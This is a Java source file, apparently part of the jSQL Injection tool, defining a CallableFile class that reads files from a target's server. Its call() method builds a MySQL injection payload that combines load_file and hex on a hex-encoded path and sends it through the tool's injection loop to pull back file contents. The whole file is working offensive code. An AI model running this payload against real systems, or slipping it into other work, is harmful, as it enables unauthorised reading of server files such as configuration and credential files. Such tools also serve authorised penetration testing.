package com.jsql.model.ao;
import java.util.concurrent.Callable;

import com.jsql.exception.PreparationException;
import com.jsql.exception.StoppableException;
import com.jsql.model.InjectionModel;
import com.jsql.model.StoppableLoopIntoResults;
import com.jsql.tool.ToolsString;

/**
 * Callable to read file source code.
 */
public class CallableFile implements Callable<CallableFile> {
    /**
     * Url of the file to read.
     */
    private String url;

    /**
     * Source code of file.
     */
    private String fileSource;

    /**
     * Create Callable to read a file.
     * @param url
     */
    public CallableFile(String url) {
        this.url = url;
    }

    @Override
    public CallableFile call() throws Exception {
        if (!InjectionModel.RAO.endFileSearch) {
            String[] sourcePage = {""};

            String hexResult = "";
            try {
                hexResult = new StoppableLoopIntoResults().action(
                        "concat(hex(load_file(0x" + ToolsString.strhex(url) + ")),0x69)",
                        sourcePage,
                        false,
                        1,
                        null);
            } catch (PreparationException e) {
                // User cancels the search, probably
            } catch (StoppableException e) {
                // User cancels the search, probably
            }
            fileSource = hexResult;
        }
        return this;
    }
    
    public String getUrl() {
        return url;
    }

    public String getFileSource() {
        return fileSource;
    }
}